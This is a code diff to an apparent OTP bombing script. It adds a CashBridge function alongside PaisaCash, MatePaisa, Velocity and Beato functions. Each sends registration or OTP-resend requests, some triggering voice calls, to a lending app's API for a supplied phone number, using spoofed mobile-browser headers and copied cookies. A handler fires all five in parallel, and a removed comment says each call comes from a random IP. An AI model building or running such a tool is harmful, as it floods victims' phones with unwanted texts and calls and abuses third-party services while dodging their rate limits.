@@ -21,7 +21,45 @@ function randomString(len = 8) {
 }
 
 // ========================
-// 1) PaisaCash
+// 1) CashBridge
+// ========================
+async function sendCashBridge(phone) {
+    const clean = phone.replace(/\D/g, '');
+    if (clean.length !== 10) throw new Error('10 digits required');
+
+    return await fg.fetch('https://loan.getcashbridge.com/sdkl/vitamin/bottom/react', {
+        method: 'POST',
+        headers: {
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Content-Type': 'application/json',
+            'sec-ch-ua-platform': 'Android',
+            'x-version': '1.0.0',
+            'x-package-name': 'com.cash.bridge.loan.gg',
+            'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
+            'sec-ch-ua-mobile': '?1',
+            'versionnumber': '1.0.0',
+            'origin': 'https://loan.getcashbridge.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://loan.getcashbridge.com/login?utm_source=chatgpt.com',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5',
+            'priority': 'u=1, i',
+            'Cookie': '_gcl_au=1.1.1354668386.1789809534'
+        },
+        body: JSON.stringify({
+            govern: clean,
+            new: 'register',
+            pattern: true,
+            disaster: 'cd414c2453dd3ec74e7c879a12e438e0'
+        })
+    });
+}
+
+// ========================
+// 2) PaisaCash
 // ========================
 async function sendPaisaCash(phone) {
     const clean = phone.replace(/\D/g, '');
@@ -47,7 +85,7 @@ async function sendPaisaCash(phone) {
 }
 
 // ========================
-// 2) MatePaisa
+// 3) MatePaisa
 // ========================
 async function sendMatePaisa(phone) {
     const clean = phone.replace(/\D/g, '');
@@ -75,7 +113,7 @@ async function sendMatePaisa(phone) {
 }
 
 // ========================
-// 3) Velocity (2-step)
+// 4) Velocity (2-step)
 // ========================
 async function sendVelocity(phone) {
     const clean = phone.replace(/\D/g, '');
@@ -98,7 +136,7 @@ async function sendVelocity(phone) {
         'priority': 'u=1, i'
     };
 
-    // Step A: create user
+    // Step A
     const createRes = await fg.fetch('https://thor.velocity.in/api/v1/users/', {
         method: 'POST',
         headers,
@@ -124,7 +162,7 @@ async function sendVelocity(phone) {
         createData?.data?.uuid ||
         null;
 
-    // Step B: auto resend OTP call
+    // Step B
     let otpData = null;
     if (otpUuid) {
         const otpRes = await fg.fetch('https://thor.velocity.in/api/v1/users/resend_otp_call', {
@@ -144,7 +182,7 @@ async function sendVelocity(phone) {
 }
 
 // ========================
-// 4) Beato (IVR OTP)
+// 5) Beato (IVR OTP)
 // ========================
 async function sendBeato(phone) {
     const clean = phone.replace(/\D/g, '');
@@ -215,8 +253,9 @@ export default {
             });
         }
 
-        // 🔥 4 APIs parallel — har ek random IP se
+        // 🔥 5 APIs parallel
         const results = await Promise.all([
+            safe('cashbridge', sendCashBridge, clean),
             safe('paisacash', sendPaisaCash, clean),
             safe('matepaisa', sendMatePaisa, clean),
             safe('velocity', sendVelocity, clean),
